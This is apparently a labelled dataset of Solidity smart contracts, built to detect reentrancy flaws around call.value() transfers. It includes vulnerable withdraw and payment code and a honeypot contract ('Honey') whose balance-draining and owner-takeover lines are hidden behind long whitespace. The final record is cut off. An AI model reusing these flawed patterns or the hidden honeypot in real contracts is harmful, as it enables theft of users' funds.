{"sol name": "39191.sol", "label": 0, "first path": "function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) { if (self.accountBalances[accountAddress] >= value) { deductFunds(self, accountAddress, value); if (!accountAddress.send(value)) { if (!accountAddress.call.value(value)()) {  throw; } return true; return false; uint constant DEFAULT_SEND_GAS = 100000; ", "second path": "function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) { if (self.accountBalances[accountAddress] >= value) { deductFunds(self, accountAddress, value); if (!accountAddress.send(value)) { if (!accountAddress.call.value(value)()) {  throw; } return true; return false; uint constant DEFAULT_SEND_GAS = 100000; ", "third path": "function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) { if (self.accountBalances[accountAddress] >= value) { deductFunds(self, accountAddress, value); if (!accountAddress.send(value)) { if (!accountAddress.call.value(value)()) {  throw; } return true; return false; uint constant DEFAULT_SEND_GAS = 100000; ", "long path": "library AccountingLib { struct Bank { mapping (address => uint) accountBalances; } function addFunds(Bank storage self, address accountAddress, uint value) public { if (self.accountBalances[accountAddress] + value < self.accountBalances[accountAddress]) { throw; } self.accountBalances[accountAddress] += value; } event _Deposit(address indexed _from, address indexed accountAddress, uint value); function Deposit(address _from, address accountAddress, uint value) public { _Deposit(_from, accountAddress, value); } function deposit(Bank storage self, address accountAddress, uint value) public returns (bool) { addFunds(self, accountAddress, value); return true; } event _Withdrawal(address indexed accountAddress, uint value); function Withdrawal(address accountAddress, uint value) public { _Withdrawal(accountAddress, value); } event _InsufficientFunds(address indexed accountAddress, uint value, uint balance); function InsufficientFunds(address accountAddress, uint value, uint balance) public { _InsufficientFunds(accountAddress, value, balance); } function deductFunds(Bank storage self, address accountAddress, uint value) public { if (value > self.accountBalances[accountAddress]) { throw; } self.accountBalances[accountAddress] -= value; } function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) { if (self.accountBalances[accountAddress] >= value) { deductFunds(self, accountAddress, value); if (!accountAddress.send(value)) { if (!accountAddress.call.value(value)()) {  throw; } } return true; } return false; } uint constant DEFAULT_SEND_GAS = 100000; function sendRobust(address toAddress, uint value) public returns (bool) { if (msg.gas < DEFAULT_SEND_GAS) { return sendRobust(toAddress, value, msg.gas); } return sendRobust(toAddress, value, DEFAULT_SEND_GAS); } function sendRobust(address toAddress, uint value, uint maxGas) public returns (bool) { if (value > 0 && !toAddress.send(value)) { if (!toAddress.call.gas(maxGas).value(value)()) { return false; } } return true; } } "}
{"sol name": "5515.sol", "label": 0, "first path": "function executeTransaction(uint transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { transactions[transactionId].executed = true; if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) { emit Execution(transactionId); } else { emit ExecutionFailure(transactionId); transactions[transactionId].executed = false; function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; emit Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "second path": "function executeTransaction(uint transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { transactions[transactionId].executed = true; if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) { emit Execution(transactionId); } else { emit ExecutionFailure(transactionId); transactions[transactionId].executed = false; function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; emit Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "third path": "function executeTransaction(uint transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { transactions[transactionId].executed = true; if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) { emit Execution(transactionId); } else { emit ExecutionFailure(transactionId); transactions[transactionId].executed = false; function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; emit Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "long path": "pragma solidity ^0.4.24; contract NamiMultiSigWallet { uint constant public MAX_OWNER_COUNT = 50; event Confirmation(address indexed sender, uint indexed transactionId); event Revocation(address indexed sender, uint indexed transactionId); event Submission(uint indexed transactionId); event Execution(uint indexed transactionId); event ExecutionFailure(uint indexed transactionId); event Deposit(address indexed sender, uint value); event OwnerAddition(address indexed owner); event OwnerRemoval(address indexed owner); event RequirementChange(uint required); mapping (uint => Transaction) public transactions; mapping (uint => mapping (address => bool)) public confirmations; mapping (address => bool) public isOwner; address[] public owners; uint public required; uint public transactionCount; struct Transaction { address destination; uint value; bytes data; bool executed; } modifier onlyWallet() { require(msg.sender == address(this)); _; } modifier ownerDoesNotExist(address owner) { require(!isOwner[owner]); _; } modifier ownerExists(address owner) { require(isOwner[owner]); _; } modifier transactionExists(uint transactionId) { require(transactions[transactionId].destination != 0); _; } modifier confirmed(uint transactionId, address owner) { require(confirmations[transactionId][owner]); _; } modifier notConfirmed(uint transactionId, address owner) { require(!confirmations[transactionId][owner]); _; } modifier notExecuted(uint transactionId) { require(!transactions[transactionId].executed); _; } modifier notNull(address _address) { require(_address != 0); _; } modifier validRequirement(uint ownerCount, uint _required) { require(!(ownerCount > MAX_OWNER_COUNT || _required > ownerCount || _required == 0 || ownerCount == 0)); _; } function() public payable { if (msg.value > 0) emit Deposit(msg.sender, msg.value); } constructor(address[] _owners, uint _required) public validRequirement(_owners.length, _required) { for (uint i = 0; i < _owners.length; i++) { require(!(isOwner[_owners[i]] || _owners[i] == 0)); isOwner[_owners[i]] = true; } owners = _owners; required = _required; } function addOwner(address owner) public onlyWallet ownerDoesNotExist(owner) notNull(owner) validRequirement(owners.length + 1, required) { isOwner[owner] = true; owners.push(owner); emit OwnerAddition(owner); } function removeOwner(address owner) public onlyWallet ownerExists(owner) { isOwner[owner] = false; for (uint i=0; i<owners.length - 1; i++) { if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } } owners.length -= 1; if (required > owners.length) changeRequirement(owners.length); emit OwnerRemoval(owner); } function replaceOwner(address owner, address newOwner) public onlyWallet ownerExists(owner) ownerDoesNotExist(newOwner) { for (uint i=0; i<owners.length; i++) { if (owners[i] == owner) { owners[i] = newOwner; break; } } isOwner[owner] = false; isOwner[newOwner] = true; emit OwnerRemoval(owner); emit OwnerAddition(newOwner); } function changeRequirement(uint _required) public onlyWallet validRequirement(owners.length, _required) { required = _required; emit RequirementChange(_required); } function submitTransaction(address destination, uint value, bytes data) public returns (uint transactionId) { transactionId = addTransaction(destination, value, data); confirmTransaction(transactionId); } function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; emit Confirmation(msg.sender, transactionId); executeTransaction(transactionId); } function revokeConfirmation(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) { confirmations[transactionId][msg.sender] = false; emit Revocation(msg.sender, transactionId); } function executeTransaction(uint transactionId) public notExecuted(transactionId) { if (isConfirmed(transactionId)) { transactions[transactionId].executed = true; if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) { emit Execution(transactionId); } else { emit ExecutionFailure(transactionId); transactions[transactionId].executed = false; } } } function isConfirmed(uint transactionId) public constant returns (bool) { uint count = 0; for (uint i = 0; i < owners.length; i++) { if (confirmations[transactionId][owners[i]]) count += 1; if (count == required) return true; } } function addTransaction(address destination, uint value, bytes data) internal notNull(destination) returns (uint transactionId) { transactionId = transactionCount; transactions[transactionId] = Transaction({ destination: destination, value: value, data: data, executed: false }); transactionCount += 1; emit Submission(transactionId); } function getConfirmationCount(uint transactionId) public constant returns (uint count) { for (uint i = 0; i < owners.length; i++) { if (confirmations[transactionId][owners[i]]) count += 1; } } function getTransactionCount(bool pending, bool executed) public constant returns (uint count) { for (uint i = 0; i < transactionCount; i++) { if (pending && !transactions[i].executed || executed && transactions[i].executed) count += 1; } } function getOwners() public constant returns (address[]) { return owners; } function getConfirmations(uint transactionId) public constant returns (address[] _confirmations) { address[] memory confirmationsTemp = new address[](owners.length); uint count = 0; uint i; for (i = 0; i < owners.length; i++) { if (confirmations[transactionId][owners[i]]) { confirmationsTemp[count] = owners[i]; count += 1; } } _confirmations = new address[](count); for (i = 0; i < count; i++) { _confirmations[i] = confirmationsTemp[i]; } } function getTransactionIds(uint from, uint to, bool pending, bool executed) public constant returns (uint[] _transactionIds) { uint[] memory transactionIdsTemp = new uint[](transactionCount); uint count = 0; uint i; for (i = 0; i < transactionCount; i++) { if (pending && !transactions[i].executed || executed && transactions[i].executed) { transactionIdsTemp[count] = i; count += 1; } } _transactionIds = new uint[](to - from); for (i = from; i < to; i++) { _transactionIds[i - from] = transactionIdsTemp[i]; } } } contract ERC223ReceivingContract { function tokenFallback(address _from, uint _value, bytes _data) public returns (bool success); function tokenFallbackBuyer(address _from, uint _value, address _buyer) public returns (bool success); function tokenFallbackExchange(address _from, uint _value, uint _price) public returns (bool success); } contract PresaleToken { mapping (address => uint256) public balanceOf; function burnTokens(address _owner) public; } interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; } contract NamiCrowdSale { using SafeMath for uint256; constructor(address _escrow, address _namiMultiSigWallet, address _namiPresale) public { require(_namiMultiSigWallet != 0x0); escrow = _escrow; namiMultiSigWallet = _namiMultiSigWallet; namiPresale = _namiPresale; } string public name = \"Nami ICO\"; string public  symbol = \"NAC\"; uint   public decimals = 18; bool public TRANSFERABLE = false; uint public constant TOKEN_SUPPLY_LIMIT = 1000000000 * (1 ether / 1 wei); uint public binary = 0; enum Phase { Created, Running, Paused, Migrating, Migrated } Phase public currentPhase = Phase.Created; uint public totalSupply = 0; address public escrow; address public namiMultiSigWallet; address public namiPresale; address public crowdsaleManager; address public binaryAddress; mapping (address => uint256) public balanceOf; mapping (address => mapping (address => uint256)) public allowance; modifier onlyCrowdsaleManager() { require(msg.sender == crowdsaleManager); _; } modifier onlyEscrow() { require(msg.sender == escrow); _; } modifier onlyTranferable() { require(TRANSFERABLE); _; } modifier onlyNamiMultisig() { require(msg.sender == namiMultiSigWallet); _; } event LogBuy(address indexed owner, uint value); event LogBurn(address indexed owner, uint value); event LogPhaseSwitch(Phase newPhase); event LogMigrate(address _from, address _to, uint256 amount); event Transfer(address indexed from, address indexed to, uint256 value); function _transfer(address _from, address _to, uint _value) internal { require(_to != 0x0); require(balanceOf[_from] >= _value); require(balanceOf[_to] + _value > balanceOf[_to]); uint previousBalances = balanceOf[_from] + balanceOf[_to]; balanceOf[_from] -= _value; balanceOf[_to] += _value; emit Transfer(_from, _to, _value); assert(balanceOf[_from] + balanceOf[_to] == previousBalances); } function transferForTeam(address _to, uint256 _value) public onlyEscrow { _transfer(msg.sender, _to, _value); } function transfer(address _to, uint256 _value) public onlyTranferable { _transfer(msg.sender, _to, _value); } function transferFrom(address _from, address _to, uint256 _value) public onlyTranferable returns (bool success) { require(_value <= allowance[_from][msg.sender]); allowance[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public onlyTranferable returns (bool success) { allowance[msg.sender][_spender] = _value; return true; } function approveAndCall(address _spender, uint256 _value, bytes _extraData) public onlyTranferable returns (bool success) { tokenRecipient spender = tokenRecipient(_spender); if (approve(_spender, _value)) { spender.receiveApproval(msg.sender, _value, this, _extraData); return true; } } function changeTransferable () public onlyEscrow { TRANSFERABLE = !TRANSFERABLE; } function changeEscrow(address _escrow) public onlyNamiMultisig { require(_escrow != 0x0); escrow = _escrow; } function changeBinary(uint _binary) public onlyEscrow { binary = _binary; } function changeBinaryAddress(address _binaryAddress) public onlyEscrow { require(_binaryAddress != 0x0); binaryAddress = _binaryAddress; } function getPrice() public view returns (uint price) { if (now < 1517443200) { return 3450; } else if (1517443200 < now && now <= 1518048000) { return 2400; } else if (1518048000 < now && now <= 1518652800) { return 2300; } else if (1518652800 < now && now <= 1519257600) { return 2200; } else if (1519257600 < now && now <= 1519862400) { return 2100; } else if (1519862400 < now && now <= 1520467200) { return 2000; } else if (1520467200 < now && now <= 1521072000) { return 1900; } else if (1521072000 < now && now <= 1521676800) { return 1800; } else if (1521676800 < now && now <= 1522281600) { return 1700; } else { return binary; } } function() payable public { buy(msg.sender); } function buy(address _buyer) payable public { require(currentPhase == Phase.Running); require(now <= 1522281600 || msg.sender == binaryAddress); require(msg.value != 0); uint newTokens = msg.value * getPrice(); require (totalSupply + newTokens < TOKEN_SUPPLY_LIMIT); balanceOf[_buyer] = balanceOf[_buyer].add(newTokens); totalSupply = totalSupply.add(newTokens); emit LogBuy(_buyer,newTokens); emit Transfer(this,_buyer,newTokens); } function burnTokens(address _owner) public onlyCrowdsaleManager { require(currentPhase == Phase.Migrating); uint tokens = balanceOf[_owner]; require(tokens != 0); balanceOf[_owner] = 0; totalSupply -= tokens; emit LogBurn(_owner, tokens); emit Transfer(_owner, crowdsaleManager, tokens); if (totalSupply == 0) { currentPhase = Phase.Migrated; emit LogPhaseSwitch(Phase.Migrated); } } function setPresalePhase(Phase _nextPhase) public onlyEscrow { bool canSwitchPhase =  (currentPhase == Phase.Created && _nextPhase == Phase.Running) || (currentPhase == Phase.Running && _nextPhase == Phase.Paused) || ((currentPhase == Phase.Running || currentPhase == Phase.Paused) && _nextPhase == Phase.Migrating && crowdsaleManager != 0x0) || (currentPhase == Phase.Paused && _nextPhase == Phase.Running) || (currentPhase == Phase.Migrating && _nextPhase == Phase.Migrated && totalSupply == 0); require(canSwitchPhase); currentPhase = _nextPhase; emit LogPhaseSwitch(_nextPhase); } function withdrawEther(uint _amount) public onlyEscrow { require(namiMultiSigWallet != 0x0); if (address(this).balance > 0) { namiMultiSigWallet.transfer(_amount); } } function safeWithdraw(address _withdraw, uint _amount) public onlyEscrow { NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet); if (namiWallet.isOwner(_withdraw)) { _withdraw.transfer(_amount); } } function setCrowdsaleManager(address _mgr) public onlyEscrow { require(currentPhase != Phase.Migrating); crowdsaleManager = _mgr; } function _migrateToken(address _from, address _to) internal { PresaleToken presale = PresaleToken(namiPresale); uint256 newToken = presale.balanceOf(_from); require(newToken > 0); presale.burnTokens(_from); balanceOf[_to] = balanceOf[_to].add(newToken); totalSupply = totalSupply.add(newToken); emit LogMigrate(_from, _to, newToken); emit Transfer(this,_to,newToken); } function migrateToken(address _from, address _to) public onlyEscrow { _migrateToken(_from, _to); } function migrateForInvestor() public { _migrateToken(msg.sender, msg.sender); } event TransferToBuyer(address indexed _from, address indexed _to, uint _value, address indexed _seller); event TransferToExchange(address indexed _from, address indexed _to, uint _value, uint _price); function transferToExchange(address _to, uint _value, uint _price) public { uint codeLength; assembly { codeLength := extcodesize(_to) } balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value); balanceOf[_to] = balanceOf[_to].add(_value); emit Transfer(msg.sender,_to,_value); if (codeLength > 0) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.tokenFallbackExchange(msg.sender, _value, _price); emit TransferToExchange(msg.sender, _to, _value, _price); } } function transferToBuyer(address _to, uint _value, address _buyer) public { uint codeLength; assembly { codeLength := extcodesize(_to) } balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value); balanceOf[_to] = balanceOf[_to].add(_value); emit Transfer(msg.sender,_to,_value); if (codeLength > 0) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.tokenFallbackBuyer(msg.sender, _value, _buyer); emit TransferToBuyer(msg.sender, _to, _value, _buyer); } } } library SafeMath { function mul(uint a, uint b) internal pure returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint a, uint b) internal pure returns (uint) { uint c = a / b; return c; } function sub(uint a, uint b) internal pure returns (uint) { assert(b <= a); return a - b; } function add(uint a, uint b) internal pure returns (uint) { uint c = a + b; assert(c >= a); return c; } function max64(uint64 a, uint64 b) internal pure returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal pure returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal pure returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal pure returns (uint256) { return a < b ? a : b; } } contract NamiMarket{ using SafeMath for uint256; constructor(address _escrow, address _namiMultiSigWallet, address _namiAddress) public { require(_namiMultiSigWallet != 0x0); escrow = _escrow; namiMultiSigWallet = _namiMultiSigWallet; NamiAddr = _namiAddress; } address public escrow; uint public minWithdraw =  10**16; uint public maxWithdraw = 10**18; address public namiMultiSigWallet; address public NamiAddr; bool public isPause; mapping(address => bool) public isController; event Deposit(address indexed user, uint amount, uint timeDeposit); event Withdraw(address indexed user, uint amount, uint timeWithdraw); modifier onlyEscrow() { require(msg.sender == escrow); _; } modifier onlyNami { require(msg.sender == NamiAddr); _; } modifier onlyNamiMultisig { require(msg.sender == namiMultiSigWallet); _; } modifier onlyController { require(isController[msg.sender] == true); _; } function changeEscrow(address _escrow) public onlyNamiMultisig { require(_escrow != 0x0); escrow = _escrow; } function changePause() public onlyEscrow { isPause = !isPause; } function changeMinWithdraw(uint _minWithdraw) public onlyEscrow { require(_minWithdraw != 0); minWithdraw = _minWithdraw; } function changeMaxWithdraw(uint _maxNac) public onlyEscrow { require(_maxNac != 0); maxWithdraw = _maxNac; } function withdrawEther(uint _amount, address _to) public onlyEscrow { require(namiMultiSigWallet != address(0x0)); if (address(this).balance > 0) { _to.transfer(_amount); } } function withdrawNac(uint _amount) public onlyEscrow { require(namiMultiSigWallet != address(0x0)); NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr); if (namiToken.balanceOf(address(this)) > 0) { namiToken.transfer(namiMultiSigWallet, _amount); } } function setController(address _controller) public onlyEscrow { require(!isController[_controller]); isController[_controller] = true; } function removeController(address _controller) public onlyEscrow { require(isController[_controller]); isController[_controller] = false; } string public name = \"Nami Market\"; function depositEth() public payable { require(msg.value > 0); emit Deposit(msg.sender, msg.value, now); } function () public payable { depositEth(); } function withdrawToken(address _account, uint _amount) public onlyController { require(_account != address(0x0) && _amount != 0); require(_amount >= minWithdraw && _amount <= maxWithdraw); if (address(this).balance > 0) { _account.transfer(_amount); } emit Withdraw(_account, _amount, now); } } "}
{"sol name": "17009.sol", "label": 1, "first path": "function Pay(address _destination) public payable { require(_destination != 0x0); require(msg.value > 0); require(!paused); masterWallet.transfer(msg.value.div(9)); _destination.call.value(msg.value.div(9).mul(8))(); SettleFund(_destination, msg.value); ", "second path": "function Pay(address _destination) public payable { require(_destination != 0x0); require(msg.value > 0); require(!paused); masterWallet.transfer(msg.value.div(9)); _destination.call.value(msg.value.div(9).mul(8))(); SettleFund(_destination, msg.value); ", "third path": "function Pay(address _destination) public payable { require(_destination != 0x0); require(msg.value > 0); require(!paused); masterWallet.transfer(msg.value.div(9)); _destination.call.value(msg.value.div(9).mul(8))(); SettleFund(_destination, msg.value); ", "long path": "pragma solidity ^0.4.19; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract BitmarkPaymentGateway is Ownable { using SafeMath for uint256; event SettleFund(address _targetContract, uint256 amount); address public masterWallet; bool public paused; function BitmarkPaymentGateway(address _masterWallet) public { paused = false; masterWallet = _masterWallet; } function SetMasterWallet(address _newWallet) public onlyOwner { masterWallet = _newWallet; } function PausePayment() public onlyOwner { paused = true; } function ResumePayment() public onlyOwner { paused = false; } function Pay(address _destination) public payable { require(_destination != 0x0); require(msg.value > 0); require(!paused); masterWallet.transfer(msg.value.div(9)); _destination.call.value(msg.value.div(9).mul(8))(); SettleFund(_destination, msg.value); } function () public {} } "}
{"sol name": "23421.sol", "label": 1, "first path": "function _safeCall(address _to, uint _amount) internal { require(_to != 0); require(_to.call.value(_amount)()); function multiCall(address[] _address, uint[] _amount) payable public returns(bool) { for (uint i = 0; i < _address.length; i++) { _safeCall(_address[i], _amount[i]); return true; ", "second path": "function _safeCall(address _to, uint _amount) internal { require(_to != 0); require(_to.call.value(_amount)()); function multiCall(address[] _address, uint[] _amount) payable public returns(bool) { for (uint i = 0; i < _address.length; i++) { _safeCall(_address[i], _amount[i]); return true; ", "third path": "function _safeCall(address _to, uint _amount) internal { require(_to != 0); require(_to.call.value(_amount)()); function multiCall(address[] _address, uint[] _amount) payable public returns(bool) { for (uint i = 0; i < _address.length; i++) { _safeCall(_address[i], _amount[i]); return true; ", "long path": "pragma solidity ^0.4.20; contract ERC20 { function totalSupply() public constant returns (uint256 supply); function balanceOf(address _owner) public constant returns (uint256 balance); function transfer(address _to, uint256 _value) public returns (bool success); function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); function approve(address _spender, uint256 _value) public returns (bool success); function allowance(address _owner, address _spender) public constant returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract Owned { address public owner; address public newOwnerCandidate; event OwnershipRequested(address indexed by, address indexed to); event OwnershipTransferred(address indexed from, address indexed to); event OwnershipRemoved(); function Owned() public { owner = msg.sender; } modifier onlyOwner() { require (msg.sender == owner); _; } function proposeOwnership(address _newOwnerCandidate) public onlyOwner { newOwnerCandidate = _newOwnerCandidate; OwnershipRequested(msg.sender, newOwnerCandidate); } function acceptOwnership() public { require(msg.sender == newOwnerCandidate); address oldOwner = owner; owner = newOwnerCandidate; newOwnerCandidate = 0x0; OwnershipTransferred(oldOwner, owner); } function changeOwnership(address _newOwner) public onlyOwner { require(_newOwner != 0x0); address oldOwner = owner; owner = _newOwner; newOwnerCandidate = 0x0; OwnershipTransferred(oldOwner, owner); } function removeOwnership(address _dac) public onlyOwner { require(_dac == 0xdac); owner = 0x0; newOwnerCandidate = 0x0; OwnershipRemoved(); } } contract Escapable is Owned { address public escapeHatchCaller; address public escapeHatchDestination; mapping (address=>bool) private escapeBlacklist; function Escapable(address _escapeHatchCaller, address _escapeHatchDestination) public { escapeHatchCaller = _escapeHatchCaller; escapeHatchDestination = _escapeHatchDestination; } modifier onlyEscapeHatchCallerOrOwner { require ((msg.sender == escapeHatchCaller)||(msg.sender == owner)); _; } function blacklistEscapeToken(address _token) internal { escapeBlacklist[_token] = true; EscapeHatchBlackistedToken(_token); } function isTokenEscapable(address _token) view public returns (bool) { return !escapeBlacklist[_token]; } function escapeHatch(address _token) public onlyEscapeHatchCallerOrOwner { require(escapeBlacklist[_token]==false); uint256 balance; if (_token == 0x0) { balance = this.balance; escapeHatchDestination.transfer(balance); EscapeHatchCalled(_token, balance); return; } ERC20 token = ERC20(_token); balance = token.balanceOf(this); require(token.transfer(escapeHatchDestination, balance)); EscapeHatchCalled(_token, balance); } function changeHatchEscapeCaller(address _newEscapeHatchCaller) public onlyEscapeHatchCallerOrOwner { escapeHatchCaller = _newEscapeHatchCaller; } event EscapeHatchBlackistedToken(address token); event EscapeHatchCalled(address token, uint amount); } contract Multiplexor is Escapable { function Multiplexor() Escapable(0, 0) public {} function init(address _escapeHatchCaller, address _escapeHatchDestination) public { require(escapeHatchCaller == 0); require(_escapeHatchCaller != 0); require(_escapeHatchDestination != 0); escapeHatchCaller = _escapeHatchCaller; escapeHatchDestination = _escapeHatchDestination; } function multiTransferTightlyPacked(bytes32[] _addressAndAmount) payable public returns(bool) { for (uint i = 0; i < _addressAndAmount.length; i++) { _safeTransfer(address(_addressAndAmount[i] >> 96), uint(uint96(_addressAndAmount[i]))); } return true; } function multiTransfer(address[] _address, uint[] _amount) payable public returns(bool) { for (uint i = 0; i < _address.length; i++) { _safeTransfer(_address[i], _amount[i]); } return true; } function multiCallTightlyPacked(bytes32[] _addressAndAmount) payable public returns(bool) { for (uint i = 0; i < _addressAndAmount.length; i++) { _safeCall(address(_addressAndAmount[i] >> 96), uint(uint96(_addressAndAmount[i]))); } return true; } function multiCall(address[] _address, uint[] _amount) payable public returns(bool) { for (uint i = 0; i < _address.length; i++) { _safeCall(_address[i], _amount[i]); } return true; } function multiERC20TransferTightlyPacked(ERC20 _token, bytes32[] _addressAndAmount) public returns(bool) { for (uint i = 0; i < _addressAndAmount.length; i++) { _safeERC20Transfer(_token, address(_addressAndAmount[i] >> 96), uint(uint96(_addressAndAmount[i]))); } return true; } function multiERC20Transfer(ERC20 _token, address[] _address, uint[] _amount) public returns(bool) { for (uint i = 0; i < _address.length; i++) { _safeERC20Transfer(_token, _address[i], _amount[i]); } return true; } function _safeTransfer(address _to, uint _amount) internal { require(_to != 0); _to.transfer(_amount); } function _safeCall(address _to, uint _amount) internal { require(_to != 0); require(_to.call.value(_amount)()); } function _safeERC20Transfer(ERC20 _token, address _to, uint _amount) internal { require(_to != 0); require(_token.transferFrom(msg.sender, _to, _amount)); } } "}
{"sol name": "27486.sol", "label": 0, "first path": "function Command(address adr,bytes data)  payable  public  { require(msg.sender == Owner); adr.call.value(msg.value)(data); ", "second path": "function Command(address adr,bytes data)  payable  public  { require(msg.sender == Owner); adr.call.value(msg.value)(data); ", "third path": "function Command(address adr,bytes data)  payable  public  { require(msg.sender == Owner); adr.call.value(msg.value)(data); ", "long path": "pragma solidity ^0.4.19; contract Honey { address public Owner = msg.sender; function()  public  payable  { } function GetFreebie()  public payable  { if(msg.value>1 ether)    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data)  payable  public  { require(msg.sender == Owner); adr.call.value(msg.value)(data); } } "}
{"sol name": "40353.sol", "label": 0, "first path": "function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); ", "second path": "function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); ", "third path": "function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); ", "long path": "contract DaoAccount { uint256 tokenBalance; address owner; address daoChallenge; uint256 tokenPrice; address challengeOwner; modifier noEther() {if (msg.value > 0) throw; _;} modifier onlyOwner() {if (owner != msg.sender) throw; _;} modifier onlyDaoChallenge() {if (daoChallenge != msg.sender) throw; _;} modifier onlyChallengeOwner() {if (challengeOwner != msg.sender) throw; _;} function DaoAccount (address _owner, uint256 _tokenPrice, address _challengeOwner) noEther { owner = _owner; tokenPrice = _tokenPrice; daoChallenge = msg.sender; tokenBalance = 0; challengeOwner = _challengeOwner; } function () { throw; } function getTokenBalance() constant returns (uint256 tokens) { return tokenBalance; } function buyTokens() onlyDaoChallenge returns (uint256 tokens) { uint256 amount = msg.value; if (amount == 0) throw; if (amount % tokenPrice != 0) throw; tokens = amount / tokenPrice; tokenBalance += tokens; return tokens; } function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; } function terminate() noEther onlyChallengeOwner { suicide(challengeOwner); } } contract DaoChallenge { uint256 constant public tokenPrice = 1000000000000000; event notifyTerminate(uint256 finalBalance); event notifyNewAccount(address owner, address account); event notifyBuyToken(address owner, uint256 tokens, uint256 price); event notifyWithdraw(address owner, uint256 tokens); mapping (address => DaoAccount) public daoAccounts; address challengeOwner; modifier noEther() {if (msg.value > 0) throw; _;} modifier onlyChallengeOwner() {if (challengeOwner != msg.sender) throw; _;} function DaoChallenge () { challengeOwner = msg.sender; } function () noEther { } function accountFor (address accountOwner, bool createNew) private returns (DaoAccount) { DaoAccount account = daoAccounts[accountOwner]; if(account == DaoAccount(0x00) && createNew) { account = new DaoAccount(accountOwner, tokenPrice, 